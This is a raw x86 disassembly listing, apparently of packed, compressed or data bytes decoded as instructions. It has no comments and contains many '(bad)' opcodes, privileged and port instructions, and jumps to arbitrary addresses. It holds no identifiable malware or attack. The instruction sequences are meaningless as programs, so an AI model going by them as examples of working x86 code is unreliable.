  422ad2:	cmp    eax,DWORD PTR [ebx-0x751031dd]
  422ad8:	sbb    al,0xb0
  422ada:	cmp    DWORD PTR [ebx-0x25e04fb0],0xfffffff0
  422ae1:	sub    al,0x15
  422ae3:	fs jno 0x422b56
  422ae6:	rol    bl,cl
  422ae8:	sub    dl,dh
  422aea:	pusha  
  422aeb:	lea    ebp,[eax-0x69]
  422aee:	sub    ebx,esp
  422af0:	int    0xb7
  422af2:	idiv   BYTE PTR [ecx+0x0]
	...
  422b00:	add    BYTE PTR [eax],al
  422b02:	lahf   
  422b03:	arpl   WORD PTR [ebp+0x72],cx
  422b06:	std    
  422b07:	jle    0x422ac8
  422b09:	out    dx,eax
  422b0a:	sbb    edi,esp
  422b0c:	mov    BYTE PTR [ebx+eax*8+0x55ccac67],dh
  422b13:	rol    DWORD PTR [ecx],1
  422b15:	add    BYTE PTR [edx+0x0],bl
  422b18:	add    BYTE PTR [eax],al
  422b1a:	or     BYTE PTR [bp+di],bh
  422b1d:	sbb    ebp,ecx
  422b1f:	rol    DWORD PTR [edi-0x75daa3c4],1
  422b25:	(bad)  
  422b26:	fdiv   DWORD PTR ds:0x7a254baa
  422b2d:	lods   al,BYTE PTR ds:[esi]
  422b2e:	mov    ebp,0xd90c99f4
  422b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b34:	dec    ebx
  422b36:	sbb    BYTE PTR [ebp+0x52bb1ffc],0x72
  422b3d:	scas   al,BYTE PTR es:[edi]
  422b3e:	adc    cl,BYTE PTR [ecx-0x7b81cadd]
  422b44:	mov    ds:0x3de63d80,eax
  422b49:	out    0x4e,al
  422b4b:	add    BYTE PTR es:[eax+0x6176bf1b],ah
  422b52:	push   ecx
  422b53:	cmp    BYTE PTR [ebp+0x1d],0xb7
  422b57:	or     DWORD PTR [esi-0xf],edi
  422b5a:	daa    
  422b5b:	lock mov bh,0x66
  422b5e:	hlt    
  422b5f:	pop    ss
  422b60:	jecxz  0x422b0f
  422b62:	neg    BYTE PTR [ebp-0x6d710797]
  422b68:	ins    BYTE PTR es:[edi],dx
  422b69:	jae    0x422bda
  422b6b:	fiadd  DWORD PTR [edx]
  422b6d:	aad    0x4f
  422b6f:	jbe    0x422b48
  422b71:	lods   al,BYTE PTR ds:[esi]
  422b72:	xor    esi,DWORD PTR [ecx+0x0]
	...
  422b81:	add    BYTE PTR [eax+0x23],dh
  422b84:	and    eax,0x7c6f7769
  422b89:	cmp    esp,DWORD PTR [eax-0xe4311e4]
  422b8f:	jb     0x422b38
  422b91:	cmp    BYTE PTR [edi+0x5a0001d1],ch
  422b97:	add    BYTE PTR [eax],al
  422b99:	add    BYTE PTR [ebp+0x72],bh
  422b9c:	or     BYTE PTR [edx+ebp*8],0x4d
  422ba0:	xchg   edx,eax
  422ba1:	fsub   DWORD PTR ds:0xc9734c9d
  422ba7:	sbb    esp,DWORD PTR [edx-0x3f]
  422baa:	iret   
  422bab:	push   ebx
  422bac:	pop    ecx
  422bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bae:	add    dl,BYTE PTR [edi]
  422bb0:	pop    ecx
  422bb1:	add    ch,bl
  422bb3:	loopne 0x422bf2
  422bb5:	xlat   BYTE PTR ds:[ebx]
  422bb6:	add    DWORD PTR [eax-0x29a7045a],edi
  422bbc:	push   esp
  422bbd:	in     eax,0x6c
  422bbf:	into   
  422bc0:	xlat   BYTE PTR ds:[ebx]
  422bc1:	adc    eax,DWORD PTR [esi-0xf2924f]
  422bc7:	sbb    DWORD PTR [ecx+0x57],0xffffff8f
  422bcb:	int3   
  422bcc:	call   0x7532583a
  422bd1:	in     eax,0x89
  422bd3:	xor    BYTE PTR cs:[eax+edi*1+0x42],ch
  422bd8:	pop    esp
  422bd9:	fmul   DWORD PTR [edi]
  422bdb:	mov    fs,WORD PTR [ecx+0x1dc4070c]
  422be1:	push   eax
  422be2:	fstp   TBYTE PTR [ebx-0x48c3b863]
  422be8:	mov    al,ds:0x928aecf7
  422bed:	loopne 0x422c08
  422bef:	shl    BYTE PTR [ecx+0x6c34ae],cl
	...
  422c01:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422c08:	popf   
  422c09:	aam    0x57
  422c0b:	(bad)
  422c0f:	js     0x422c61
  422c11:	pushf  
  422c12:	or     edx,edx
  422c14:	add    DWORD PTR [eax],eax
  422c16:	pop    edx
  422c17:	add    BYTE PTR [eax],al
  422c19:	add    BYTE PTR [edx+0x7a],dh
  422c1c:	mov    esp,0x7d7f70bf
  422c21:	xor    ebx,DWORD PTR [edi+0x5a]
  422c24:	mov    edi,0xc38eac6b
  422c29:	iret   
  422c2a:	mov    ebx,0x83726ca1
  422c2f:	pop    edx
  422c30:	fbstp  TBYTE PTR [ebx]
  422c32:	fisttp WORD PTR ds:0x70f922ee
  422c38:	or     al,0x3a
  422c3a:	clc    
  422c3b:	mov    esi,0x1f0565b5
  422c40:	lods   eax,DWORD PTR ds:[esi]
  422c41:	fsubr  st,st(2)
  422c43:	xchg   esi,ecx
  422c45:	iret   
  422c46:	inc    esi
  422c47:	es sahf 
  422c49:	int    0x42
  422c4b:	scas   al,BYTE PTR es:[edi]
  422c4c:	rcr    BYTE PTR [ebx+0x24],1
  422c4f:	dec    ebx
  422c50:	pop    ebx
  422c51:	stc    
  422c52:	fucomp st(3)
  422c54:	jg     0x422c84
  422c56:	pop    edx
  422c57:	adc    DWORD PTR [edx+0x2d],edx
  422c5a:	out    dx,al
  422c5b:	sbb    DWORD PTR [esi],0x3e
  422c5e:	loope  0x422cad
  422c60:	adc    eax,0xc835432a
  422c65:	retf   
  422c66:	int3   
  422c67:	sub    bl,BYTE PTR [ecx-0x1edac553]
  422c6d:	xchg   DWORD PTR [esi],ecx
  422c6f:	xor    BYTE PTR [edi+0xdcf3a2],ah
	...
  422c81:	add    ah,dh
  422c83:	mov    dl,0x32
  422c85:	(bad)  
  422c86:	jbe    0x422c5e
  422c88:	hlt    
  422c89:	mov    dl,0xb1
  422c8b:	and    al,0xfe
  422c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c8e:	repnz int3 
  422c90:	and    eax,0x1d26308
  422c95:	add    BYTE PTR [edx+0x0],bl
  422c98:	add    BYTE PTR [eax],al
  422c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c9b:	rol    DWORD PTR [ebx],1
  422c9d:	jmp    0x422cc8
  422c9f:	ficomp DWORD PTR [edx+0x1b]
  422ca2:	cmp    edi,edi
  422ca4:	call   0x2a4ec78a
  422ca9:	push   ecx
  422caa:	xchg   esi,eax
  422cab:	mov    esi,DWORD PTR [ebp+edi*4+0x4e]
  422caf:	aaa    
  422cb0:	add    BYTE PTR [ecx],bh
  422cb2:	add    DWORD PTR ds:0x707ac5e7,0xa15d869a
  422cbc:	and    eax,ecx
  422cbe:	push   esp
  422cbf:	inc    ebx
  422cc0:	or     eax,ebx
  422cc2:	sbb    DWORD PTR [edi+0x66],0xd7497d0
  422cc9:	pop    ds
  422cca:	(bad)  
  422ccb:	scas   al,BYTE PTR es:[edi]
  422ccc:	cmp    BYTE PTR [ebx-0x63],ch
  422ccf:	pop    ebx
  422cd0:	lahf   
  422cd1:	inc    edi
  422cd2:	pop    esi
  422cd3:	inc    edx
  422cd4:	jge    0x422cf0
  422cd6:	inc    edx
  422cd7:	xor    al,0x3c
  422cd9:	cmc    
  422cda:	test   DWORD PTR [eax+0x67aa81e1],ebp
  422ce0:	lds    esp,FWORD PTR [ebp+0x5d]
  422ce3:	lods   eax,DWORD PTR ds:[esi]
  422ce4:	or     eax,0x79b42115
  422ce9:	push   edx
  422cea:	sub    al,0xf
  422cec:	mov    ds:0x46e8e37d,al
  422cf1:	int3   
  422cf2:	mov    bh,0xd
	...
  422d00:	add    BYTE PTR [eax],al
  422d02:	xor    dl,bl
  422d04:	into   
  422d05:	mov    ds:0xd37ebfef,al
  422d0a:	sub    edi,DWORD PTR [esi]
  422d0c:	out    0x3f,eax
  422d0e:	addr16 mov ebp,0xd2bd790e
  422d14:	add    DWORD PTR [eax],eax
  422d16:	pop    edx
  422d17:	add    BYTE PTR [eax],al
  422d19:	add    BYTE PTR [ecx-0xc],dl
  422d1c:	jne    0x422cee
  422d1e:	(bad)  
  422d20:	ds sbb ecx,eax
  422d23:	lea    esi,[eax-0x3a520f34]
  422d29:	mov    ss,esp
  422d2b:	sub    BYTE PTR [edx+0x32],dh
  422d2e:	jecxz  0x422d48
  422d30:	adc    al,bl
  422d32:	sbb    BYTE PTR [edx-0x25],0xad
  422d36:	sub    dl,ah
  422d38:	adc    DWORD PTR [ebp-0x3f],edx
  422d3b:	imul   ebp,DWORD PTR [ecx+0x301a7c5e],0x8
  422d42:	cwde   
  422d43:	dec    eax
  422d44:	dec    ecx
  422d45:	and    DWORD PTR [ebp+0x1e],esi
  422d48:	mov    DWORD PTR [edx-0x20],ecx
  422d4b:	inc    eax
  422d4c:	push   ss
  422d4d:	add    DWORD PTR [ebp-0x7b],edi
  422d50:	or     al,0xf2
  422d52:	xchg   esi,eax
  422d53:	psubsw mm7,QWORD PTR [ecx+0x1a094c3e]
  422d5a:	push   cs
  422d5b:	sub    BYTE PTR [edi-0x1edcf747],0xc1
  422d62:	aad    0x24
  422d64:	mov    cl,0xbb
  422d66:	adc    edi,esp
  422d68:	fcmovu st,st(0)
  422d6a:	nop
  422d6b:	mov    WORD PTR [ecx+ecx*8+0x1903bae1],es
  422d72:	ins    DWORD PTR es:[edi],dx
  422d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  422d80:	add    BYTE PTR [eax],al
  422d82:	fucomi st,st(5)
  422d84:	outs   dx,BYTE PTR ds:[esi]
  422d85:	and    bh,BYTE PTR [esi-0x5d]
  422d88:	(bad)  
  422d8a:	pop    esi
  422d8b:	(bad)  
  422d8c:	mov    DWORD PTR [ebp-0x7ca6d4c8],ecx
  422d92:	pop    ss
  422d93:	rol    DWORD PTR [ecx],cl
  422d95:	add    BYTE PTR [edx+0x0],bl
  422d98:	add    BYTE PTR [eax],al
  422d9a:	xchg   esi,eax
  422d9b:	lea    esp,[esi-0x75]
  422d9e:	ja     0x422dbd
  422da0:	dec    ecx
  422da1:	es push es
  422da3:	mov    WORD PTR [ebp+0x10c65f0b],es
  422da9:	idiv   BYTE PTR [eax+0x6e5ca84d]
  422daf:	test   eax,0xc9c2d9f3
  422db4:	jg     0x422dfa
  422db6:	push   ebp
  422db8:	mov    eax,0xb724882
  422dbd:	jmp    0x422d6b
  422dbf:	das    
  422dc0:	jnp    0x422df3
  422dc2:	pop    ebx
  422dc3:	jno    0x422e1e
  422dc5:	sbb    eax,0xbdded053
  422dca:	pop    esp
  422dcb:	fdivr  QWORD PTR [edx+0x62]
  422dce:	pop    es
  422dcf:	not    esi
  422dd1:	mov    edx,0x60db298
  422dd6:	ret    0x97a7
  422dd9:	or     edi,DWORD PTR [edi+0x4b]
  422ddc:	adc    DWORD PTR [edx],edx
  422dde:	cmc    
  422ddf:	sar    DWORD PTR [ebp-0x3d4f07e9],0xdc
  422de6:	int    0x67
  422de8:	add    eax,0x30f41ecb
  422ded:	mov    BYTE PTR [bp+di],dl
  422df0:	inc    ecx
  422df1:	sub    ebp,DWORD PTR [ebp+0x6d]
	...
  422dff:	add    BYTE PTR [eax],al
  422e01:	add    BYTE PTR ds:0x6f976b22,al
  422e07:	(bad)  
  422e09:	mov    dl,0x66
  422e0b:	and    BYTE PTR [esi-0x60cdc496],ah
  422e11:	clc    
  422e12:	jno    0x422de7
  422e14:	add    DWORD PTR [eax],eax
  422e16:	pop    edx
  422e17:	add    BYTE PTR [eax],al
  422e19:	add    BYTE PTR [eax],cl
  422e1b:	xchg   ecx,eax
  422e1c:	into   
  422e1d:	push   0x481133f5
  422e22:	push   edi
  422e23:	or     eax,0xeac8e5a
  422e28:	enter  0x2aba,0xfe
  422e2c:	aad    0x6b
  422e2e:	xchg   edi,eax
  422e2f:	dec    edx
  422e30:	xor    al,0xaf
  422e32:	call   0xaca5c490
  422e37:	mov    bh,cl
  422e39:	sti    
  422e3a:	int3   
  422e3b:	mov    bh,BYTE PTR [ecx]
  422e3d:	push   cs
  422e3e:	push   0x66
  422e40:	fsubr  QWORD PTR ds:0xe03c8621
  422e46:	icebp  
  422e47:	in     al,0xd0
  422e49:	sti    
  422e4a:	dec    edi
  422e4b:	fwait
  422e4c:	push   ecx
  422e4d:	xor    ebx,esp
  422e4f:	cwde   
  422e50:	inc    ecx
  422e51:	mov    ah,al
  422e53:	xchg   esi,eax
  422e54:	mov    ds:0xbf2e9b83,eax
  422e59:	mov    bh,0x5b
  422e5b:	inc    edx
  422e5c:	push   0x2e
  422e5e:	mov    esi,0xf59d1d68
  422e63:	bound  edx,QWORD PTR [ecx]
  422e65:	mov    gs,eax
  422e67:	cdq    
  422e68:	dec    eax
  422e69:	fist   WORD PTR [ebx+edi*1+0x3def0c58]
  422e70:	jecxz  0x422ece
  422e72:	jl     0x422e1c
	...
  422e80:	add    BYTE PTR [eax],al
  422e82:	mov    edx,esp
  422e84:	and    al,0xd9
  422e86:	jg     0x422e81
  422e88:	call   esi
  422e8a:	into   
  422e8b:	inc    ebp
  422e8c:	mov    bh,0x11
  422e8e:	hlt    
  422e8f:	jge    0x422e8f
  422e91:	push   ebp
  422e92:	retf   
  422e93:	rol    DWORD PTR [ecx],cl
  422e95:	add    BYTE PTR [edx+0x0],bl
  422e98:	add    BYTE PTR [eax],al
  422e9a:	out    0xde,al
  422e9c:	inc    eax
  422e9d:	add    BYTE PTR [eax+0x3],dl
  422ea0:	pop    es
  422ea1:	pop    es
  422ea2:	cs mov al,0x1
  422ea5:	(bad)  
  422ea6:	rcl    DWORD PTR ds:[edx+0x11],cl
  422eaa:	dec    eax
  422eab:	adc    edx,0x1d
  422eae:	mov    bl,0xb
  422eb0:	sbb    al,0xe0
  422eb2:	imul   ebp,DWORD PTR ds:0x9b713672,0x11bb2e28
  422ebc:	retf   
  422ebd:	pop    edi
  422ebe:	ret    0xe0b
  422ec1:	leave  
  422ec2:	inc    edx
  422ec3:	stc    
  422ec4:	js     0x422eca
  422ec6:	aad    0xc
  422ec8:	popa   
  422ec9:	or     BYTE PTR ds:0x476f6528,0x5b
  422ed0:	inc    ebx
  422ed1:	and    ah,dl
  422ed3:	mov    al,0xbd
  422ed5:	cmp    dh,al
  422ed7:	sbb    BYTE PTR [ecx+0x54de1b47],cl
  422edd:	cwde   
  422ede:	push   es
  422edf:	and    eax,0x41959880
  422ee4:	cmp    eax,0x88299f1e
  422ee9:	inc    ecx
  422eea:	sahf   
  422eeb:	mov    WORD PTR [edx+0x5968cd11],es
  422ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef2:	mov    es,WORD PTR ds:[eax]
	...
  422f01:	add    dh,bl
  422f03:	sub    DWORD PTR [eax-0x210c002e],ebx
  422f09:	sub    eax,0x4af35f6
  422f0e:	lea    esp,[eax]
  422f10:	sub    eax,0x1d42532
  422f15:	add    BYTE PTR [edx+0x0],bl
  422f18:	add    BYTE PTR [eax],al
  422f1a:	(bad)  
  422f1b:	jge    0x422eab
  422f1d:	neg    BYTE PTR [ebx+0x419c213a]
  422f23:	xchg   ebx,eax
  422f24:	jmp    0x4e19:0xaf6bb627
  422f2b:	add    ch,BYTE PTR [edx-0x1b]
  422f2e:	fsubp  st(2),st
  422f30:	lock sub al,0x8d
  422f33:	push   ecx
  422f34:	aaa    
  422f35:	test   DWORD PTR [eax+ebp*4-0x3e],ebp
  422f39:	lods   al,BYTE PTR ds:[esi]
  422f3a:	outs   dx,BYTE PTR ds:[esi]
  422f3b:	or     ah,ah
  422f3d:	in     al,dx
  422f3e:	int3   
  422f3f:	cld    
  422f40:	xor    BYTE PTR [edx],0x9
  422f43:	pop    ebx
  422f44:	pushf  
  422f45:	test   BYTE PTR [eax],0x1c
  422f48:	sbb    DWORD PTR [eax-0x7],0xfffffff0
  422f4c:	inc    ebx
  422f4d:	jne    0x422f0b
  422f4f:	dec    edi
  422f50:	sbb    BYTE PTR [ebx+0x24],dl
  422f53:	mov    ah,0x1e
  422f55:	adc    eax,0xf0afb3d0
  422f5a:	aad    0x38
  422f5c:	push   ecx
  422f5d:	xchg   ebx,eax
  422f5e:	js     0x422fc8
  422f60:	adc    eax,0x54fc2471
  422f65:	sub    dh,BYTE PTR [esi]
  422f67:	aas    
  422f68:	es in  eax,0xcd
  422f6b:	gs inc ebp
  422f6d:	sbb    ebp,DWORD PTR ds:0x4da50367
  422f73:	inc    ecx
	...
  422f80:	add    BYTE PTR [eax],al
  422f82:	dec    esi
  422f83:	aas    
  422f84:	int3   
  422f85:	sbb    eax,0x7fdffffd
  422f8a:	out    dx,eax
  422f8b:	loopne 0x422fa3
  422f8d:	lods   al,BYTE PTR ds:[esi]
  422f8e:	cmp    dh,BYTE PTR [esi+eax*2-0x1c]
  422f92:	jg     0x422f68
  422f94:	add    DWORD PTR [eax],eax
  422f96:	pop    edx
  422f97:	add    BYTE PTR [eax],al
  422f99:	add    BYTE PTR [ebp-0x1f],dh
  422f9c:	fbld   TBYTE PTR [eax+esi*4]
  422f9f:	out    0x2f,al
  422fa1:	pop    ss
  422fa2:	imul   esp,ebx,0x4d
  422fa5:	cli    
  422fa6:	xor    ch,dh
  422fa8:	sbb    edx,DWORD PTR [ebp+0x505b9b4]
  422fae:	cmp    BYTE PTR [esi+eiz*2-0x80],0x42
  422fb3:	xchg   BYTE PTR [eax],ah
  422fb5:	cmp    edx,DWORD PTR [ecx]
  422fb7:	cmp    dh,BYTE PTR [edx+ebx*2-0x6b9dc1fa]
  422fbe:	sar    DWORD PTR [ebp+0x458dfe13],cl
  422fc4:	sub    bl,dh
  422fc6:	pushf  
  422fc7:	retf   
  422fc8:	in     eax,dx
  422fc9:	in     al,dx
  422fca:	lock ins DWORD PTR es:[edi],dx
  422fcc:	dec    ebp
  422fcd:	push   esi
  422fce:	dec    ebx
  422fcf:	das    
  422fd0:	pop    es
  422fd1:	mov    ebx,0x558809dd
  422fd6:	outs   dx,BYTE PTR ds:[esi]
  422fd7:	cmp    al,0xe5
  422fd9:	jmp    0x58f62e7f
  422fde:	jmp    0x19e70ce1
  422fe3:	inc    eax
  422fe4:	pop    ecx
  422fe5:	jbe    0x422fc3
  422fe7:	xor    BYTE PTR [ebx-0x70],0x3f
  422feb:	mov    ebx,ss
  422fed:	outs   dx,DWORD PTR ds:[esi]
  422fee:	xor    esp,DWORD PTR [esi+0x17]
  422ff1:	neg    cl
  422ff3:	xor    al,0x0
	...
  423001:	add    BYTE PTR [esi],bl
  423003:	test   eax,0x7ff735f6
  423008:	fild   QWORD PTR [ebx-0x5f9ed871]
  42300e:	test   eax,0xd9006bd5
  423013:	aam    0x1
  423015:	add    BYTE PTR [edx+0x0],bl
  423018:	add    BYTE PTR [eax],al
  42301a:	dec    eax
  42301b:	arpl   WORD PTR [esi+edi*2+0x1d216446],cx
  423022:	(bad)  
  423023:	cld    
  423024:	js     0x42304c
  423026:	cmp    DWORD PTR [edx],0xe73b7453
  42302c:	sbb    edi,DWORD PTR [eax+0x38]
  42302f:	or     eax,0xbd65aa76
  423034:	ret    0x5b82
  423037:	test   BYTE PTR [eax],cl
  423039:	sub    edx,DWORD PTR [eax-0x1a8d7d35]
  42303f:	dec    edx
  423040:	not    ebp
  423042:	inc    esi
  423043:	retf   0x7312
  423046:	xor    eax,0x8553cca3
  42304b:	test   dl,dl
  42304d:	jne    0x422ffe
  42304f:	jnp    0x42309b
  423051:	pop    ebp
  423052:	ins    DWORD PTR es:[edi],dx
  423053:	ins    BYTE PTR es:[edi],dx
  423054:	cmp    al,0x40
  423056:	mov    ch,0x70
  423058:	in     eax,dx
  423059:	fwait
  42305a:	push   ebx
  42305b:	dec    esi
  42305c:	ss pop esp
  42305e:	push   esi
  42305f:	pop    edi
  423060:	add    cl,dl
  423062:	jle    0x42305a
  423064:	mov    esp,0xbf2125cf
  423069:	push   cs
  42306a:	sub    esp,DWORD PTR [edi-0x467789f7]
  423070:	test   BYTE PTR [ebx+edi*1+0x88],bl
	...
  42307f:	add    BYTE PTR [eax],al
  423081:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  423087:	lods   eax,DWORD PTR ds:[esi]
  423088:	fcomi  st,st(7)
  42308a:	sar    BYTE PTR [ebx],cl
  42308c:	(bad)  
  42308d:	add    BYTE PTR [esi+0x339af5a0],bh
  423093:	aad    0x1
  423095:	add    BYTE PTR [edx+0x0],bl
  423098:	add    BYTE PTR [eax],al
  42309a:	dec    ebx
  42309b:	jl     0x42304c
  42309d:	leave  
  42309e:	ins    DWORD PTR es:[edi],dx
  42309f:	inc    esi
  4230a0:	bound  ecx,QWORD PTR [ecx-0x2e37b608]
  4230a6:	mov    ah,0x44
  4230a8:	aad    0xb8
  4230aa:	or     DWORD PTR [eax],0x2d
  4230ad:	sub    BYTE PTR [edx-0x58f3fb62],0xc4
  4230b4:	aas    
  4230b5:	cmp    al,0xdd
  4230b7:	dec    ecx
  4230b8:	or     DWORD PTR [ecx-0x3c],edi
  4230bb:	stos   DWORD PTR es:[edi],eax
  4230bc:	shl    bl,0x39
  4230bf:	div    DWORD PTR [ecx]
  4230c1:	inc    ebx
  4230c2:	dec    esp
  4230c3:	int3   
  4230c4:	repnz iret 
  4230c6:	arpl   WORD PTR [edi-0x6f36c297],cx
  4230cc:	ss mov ah,0x4
  4230cf:	dec    ebx
  4230d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230d1:	mov    bh,0x12
  4230d3:	cmp    ebx,eax
  4230d5:	rol    esp,cl
  4230d7:	and    dl,bl
  4230d9:	(bad)  
  4230db:	xlat   BYTE PTR ds:[ebx]
  4230dc:	adc    al,0xfa
  4230de:	stos   BYTE PTR es:[edi],al
  4230df:	neg    DWORD PTR [eax+0x44]
  4230e2:	adc    esi,DWORD PTR [ebx+ebp*2+0x20a2eb41]
  4230e9:	mov    eax,ds:0x9c356d2
  4230ee:	sub    al,0x3b
  4230f0:	mov    ds:0xeda4ef,eax
	...
  423101:	add    BYTE PTR [eax],cl
  423103:	div    DWORD PTR [edi+0x4a]
  423106:	dec    edx
  423108:	cmp    eax,0x2e8eedf7
  42310d:	dec    eax
  42310e:	in     al,0x95
  423110:	fiadd  DWORD PTR [ebp+ecx*4+0x5a0001d5]
  423117:	add    BYTE PTR [eax],al
  423119:	add    BYTE PTR [edi+0x31d0968b],dh
  42311f:	cli    
  423120:	cld    
  423121:	imul   ebp,DWORD PTR [ebp+0x2aaad565],0xbac1e842
  42312b:	or     al,0x4a
  42312d:	xor    eax,0x196540fc
  423132:	js     0x4230e3
  423134:	shl    DWORD PTR [ebp+0x3b554c62],0xd7
  42313b:	mov    al,0xd3
  42313d:	lods   al,BYTE PTR ds:[esi]
  42313e:	(bad)  
  423140:	je     0x4230f3
  423142:	(bad)  
  423143:	xchg   ecx,eax
  423144:	cdq    
  423145:	clc    
  423146:	xor    DWORD PTR ds:[edx-0x2bc0a1a8],0xb9cd7966
  423151:	sbb    bh,ch
  423153:	or     dl,BYTE PTR [edx+0x7c]
  423156:	or     edi,ebx
  423158:	fdivr  QWORD PTR [esi+0x6a]
  42315b:	xor    ebx,eax
  42315d:	gs pop edi
  42315f:	adc    esi,esp
  423161:	stos   BYTE PTR es:[edi],al
  423162:	add    eax,0xd5c92a4e
  423167:	daa    
  423168:	popa   
  423169:	sbb    al,0x8a
  42316b:	in     eax,0x98
  42316d:	xchg   esp,eax
  42316e:	xchg   ecx,eax
  42316f:	and    ch,dl
  423171:	(bad)  
  423172:	and    eax,0x5b
	...
  42317f:	add    BYTE PTR [eax],al
  423181:	add    BYTE PTR [esi],dh
  423183:	arpl   WORD PTR [eax-0x10],bp
  423186:	jge    0x423183
  423188:	mov    esi,0x8c7853e7
  42318d:	daa    
  42318e:	fmul   QWORD PTR [ebx-0x2a1879c9]
  423194:	add    DWORD PTR [eax],eax
  423196:	pop    edx
  423197:	add    BYTE PTR [eax],al
  423199:	add    cl,dl
  42319b:	push   ss
  42319c:	sbb    bh,0x79
  42319f:	scas   al,BYTE PTR es:[edi]
  4231a0:	sub    cl,ch
  4231a2:	or     al,0xc
  4231a4:	xor    ebx,DWORD PTR [edi+0x74]
  4231a7:	push   ss
  4231a8:	(bad)  
  4231a9:	xor    al,BYTE PTR [esi+0x23]
  4231ac:	mov    ebx,0x300192a4
  4231b1:	dec    BYTE PTR [ebx]
  4231b3:	fimul  WORD PTR [ebx]
  4231b5:	and    eax,0x54ab3fbe
  4231ba:	adc    al,0xb2
  4231bc:	jmp    0x9269:0x9fe15dc8
  4231c3:	test   dl,al
  4231c5:	sbb    BYTE PTR [ebx-0x291926e],bh
  4231cb:	sub    ch,cl
  4231cd:	test   DWORD PTR [ebx],eax
  4231cf:	add    ecx,DWORD PTR [eax+0x5]
  4231d2:	stos   DWORD PTR es:[edi],eax
  4231d3:	push   ss
  4231d4:	dec    edx
  4231d5:	push   edx
  4231d6:	lods   eax,DWORD PTR ds:[esi]
  4231d7:	pop    ebx
  4231d8:	(bad)  
  4231d9:	ja     0x42320b
  4231db:	ret    0xce2e
  4231de:	adc    BYTE PTR [edx+ecx*8-0x368c08e5],ah
  4231e5:	mov    bh,0x15
  4231e7:	jnp    0x423232
  4231e9:	jp     0x42321f
  4231eb:	(bad)  
  4231ec:	shr    DWORD PTR [ecx],cl
  4231ee:	movsx  esp,BYTE PTR [ebp+0x6ba6b0]
	...
  423201:	add    BYTE PTR [edi],ah
  423203:	ss lahf 
  423205:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42320b:	and    eax,0x41bc075b
  423210:	mov    edx,0x1dcef72
  423215:	add    BYTE PTR [edx+0x0],bl
  423218:	add    BYTE PTR [eax],al
  42321a:	mov    dl,0x58
  42321c:	mov    cl,BYTE PTR [ebx+edx*2+0x70]
  423220:	mov    dh,0xb0
  423222:	xor    DWORD PTR [edi+eax*4],0xf696eaea
  423229:	add    cl,cl
  42322b:	pushf  
  42322c:	xor    al,0x2c
  42322e:	dec    ecx
  42322f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423230:	cmp    bl,BYTE PTR [ebx+0x5ab16dbe]
  423236:	js     0x423261
  423238:	cmp    edi,ecx
  42323a:	xor    DWORD PTR [ecx],0xb1405706
  423240:	(bad)  
  423241:	into   
  423242:	sbb    eax,0xda63cc07
  423247:	pop    es
  423248:	adc    DWORD PTR [ecx+0x36a47de7],edx
  42324e:	icebp  
  42324f:	xor    ah,cl
  423251:	lock add DWORD PTR [edx+0x5d],edx
  423255:	add    al,0x4d
  423257:	mov    al,0xc7
  423259:	mov    edi,0xff9746d
  42325e:	add    al,0x8c
  423260:	jbe    0x4232d3
  423262:	and    eax,0x97650503
  423267:	fsub   st,st(6)
  423269:	push   ebx
  42326a:	pusha  
  42326b:	pop    ecx
  42326c:	fidivr DWORD PTR [esi+ebp*4]
  42326f:	je     0x423227
  423271:	pop    esp
  423272:	or     DWORD PTR [ebp+0x0],ecx
	...
  423280:	add    BYTE PTR [eax],al
  423282:	aaa    
  423283:	(bad)  
  423284:	out    0xc2,eax
  423286:	mul    ebx
  423288:	aaa    
  423289:	cmc    
  42328a:	xchg   ecx,eax
  42328b:	call   0x5150:0x4354eef4
  423292:	dec    ecx
  423293:	fld    QWORD PTR [ecx]
  423295:	add    BYTE PTR [edx+0x0],bl
  423298:	add    BYTE PTR [eax],al
  42329a:	jo     0x42328f
  42329c:	mov    eax,0xd491f3aa
  4232a1:	sbb    DWORD PTR [edi],ecx
  4232a3:	cmp    DWORD PTR [edi],0x94d4b0d3
  4232a9:	push   esi
  4232aa:	(bad)  
  4232ab:	push   edi
  4232ac:	jl     0x4232b3
  4232ae:	icebp  
  4232af:	pop    edi
  4232b0:	jnp    0x42327d
  4232b2:	aad    0x27
  4232b4:	pusha  
  4232b5:	dec    ecx
  4232b6:	(bad)  
  4232b7:	gs fcmovnb st,st(5)
  4232ba:	data16 add BYTE PTR [eax+0x3f],bh
  4232be:	test   DWORD PTR [edi+0x32],ecx
  4232c1:	test   al,0xa3
  4232c4:	cmp    BYTE PTR [ebx-0x6ba00aac],ch
  4232ca:	pop    eax
  4232cb:	xchg   ebx,eax
  4232cc:	sahf   
  4232cd:	in     al,dx
  4232ce:	fild   DWORD PTR [edi]
  4232d0:	jbe    0x4232f2
  4232d2:	(bad)  
  4232d3:	icebp  
  4232d4:	xor    eax,0xbd24d5b1
  4232d9:	pusha  
  4232da:	cli    
  4232db:	push   ds
  4232dc:	test   eax,0x6ce79d1a
  4232e1:	int3   
  4232e2:	inc    edi
  4232e3:	jb     0x4232e8
  4232e5:	in     eax,dx
  4232e6:	dec    ecx
  4232e7:	repz je 0x423364
  4232ea:	out    0xe0,eax
  4232ec:	(bad)  
  4232ed:	cmp    ch,cl
  4232ef:	cmp    eax,0x56efd210
	...
  423300:	add    BYTE PTR [eax],al
  423302:	push   ss
  423303:	aad    0xdf
  423305:	out    dx,eax
  423306:	fucomip st,st(7)
  423308:	ss std 
  42330a:	cmp    BYTE PTR [esi-0x50b9a0c6],al
  423310:	push   esp
  423311:	adc    DWORD PTR [ebx+0x5a0001dd],esp
  423317:	add    BYTE PTR [eax],al
  423319:	add    BYTE PTR ds:0x6ed7e2ce,cl
  42331f:	rcr    DWORD PTR gs:[ecx-0x1],0x92
  423324:	repz sub eax,0x819f6c3b
  42332a:	lods   eax,DWORD PTR ds:[esi]
  42332b:	lock jle 0x42339e
  42332e:	mov    dh,ch
  423330:	dec    esi
  423331:	iret   
  423332:	faddp  st(3),st
  423334:	pushf  
  423335:	mov    bl,dh
  423337:	sar    DWORD PTR [edx+edi*8],1
